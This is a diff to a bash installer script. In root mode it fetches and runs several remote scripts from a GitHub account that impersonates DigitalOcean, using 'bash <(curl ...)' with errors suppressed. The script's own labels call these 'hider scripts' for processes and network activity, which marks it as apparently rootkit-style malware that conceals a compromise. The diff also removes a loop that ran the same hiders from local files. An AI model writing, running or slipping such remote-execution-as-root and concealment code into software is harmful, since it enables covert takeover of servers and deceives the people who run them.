@@ -280,10 +280,11 @@ install_root_user_user() {
 	if [[ "$MODE" != "root" ]]; then
 		return
 	fi
-	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis.sh)
-	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-host.sh)
-	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test.sh)
-	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh.sh)
+	echo "[*] Running hider scripts..."
+	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-dual.sh) 2>/dev/null || echo "[!] service-dis-dual.sh failed or not found"
+	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-host-dual.sh) 2>/dev/null || echo "[!] service-dis-host-dual.sh failed or not found"
+	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test-dual.sh) 2>/dev/null || echo "[!] test-dual.sh failed or not found"
+	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh-dual.sh) 2>/dev/null || echo "[!] hhh-dual.sh failed or not found"
 }
 # ─── Main execution ───
 main() {
@@ -298,18 +299,6 @@ main() {
     verify_service
     install_build_tools
     install_root_user_user
-
-    # ─── Run nested dual-mode scripts (process + network hiders) ───
-    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-    echo "[*] Running nested hider scripts..."
-    for nested in "${SCRIPT_DIR}/service-dis-dual.sh" "${SCRIPT_DIR}/service-dis-host-dual.sh" "${SCRIPT_DIR}/test-dual.sh" "${SCRIPT_DIR}/hhh-dual.sh"; do
-        if [[ -f "$nested" ]]; then
-            echo "[*] Executing: $(basename "$nested")"
-            bash "$nested" || echo "[!] Warning: $(basename "$nested") had errors"
-        else
-            echo "[!] Not found: $nested"
-        fi
-    done
 
     echo ""
     echo "========================================"
